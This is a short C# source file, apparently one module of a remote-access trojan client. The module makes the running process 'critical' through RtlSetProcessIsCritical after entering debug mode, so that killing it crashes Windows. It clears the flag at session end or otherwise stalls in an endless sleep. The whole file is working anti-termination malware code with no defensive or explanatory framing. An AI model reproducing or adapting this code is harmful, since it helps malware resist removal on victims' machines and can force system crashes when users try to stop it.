using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Threading;
using Client.Things;
using Client.Defs;

namespace Client.Configuration
{
    public static class processcritical
    {

        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Config.ProcessCritical) && Check.Admin())
            {
                Exit();
            }
        }
        public static void critical()
        {
            try
            {
                SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                Process.EnterDebugMode();
                Check.RtlSetProcessIsCritical(1, 0, 0);
            }
            catch { }
        }
        public static void Exit()
        {
            try
            {
                Check.RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {
                while (true)
                {
                    Thread.Sleep(696969699);
                }
            }
        }
    }
}
